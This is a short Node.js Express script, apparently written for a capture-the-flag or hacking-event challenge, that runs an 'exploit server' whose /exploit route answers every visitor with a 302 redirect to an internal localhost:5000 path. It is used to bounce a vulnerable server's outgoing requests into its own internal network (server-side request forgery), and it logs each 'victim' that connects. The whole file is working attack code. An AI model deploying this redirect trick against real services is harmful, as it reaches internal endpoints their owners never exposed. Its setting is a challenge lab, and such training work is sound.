const express = require('express');
const app = express();

app.get('/exploit', (req, res) => {
    // The internal target you are trying to hit via SSRF
    const target = 'http://localhost:5000/hackaicon_ethiack_1337_lmao';
    
    console.log(`[+] Victim connected! Redirecting them to ${target}`);
    res.redirect(302, target);
});

app.listen(3000, () => console.log('Exploit server running on port 3000'));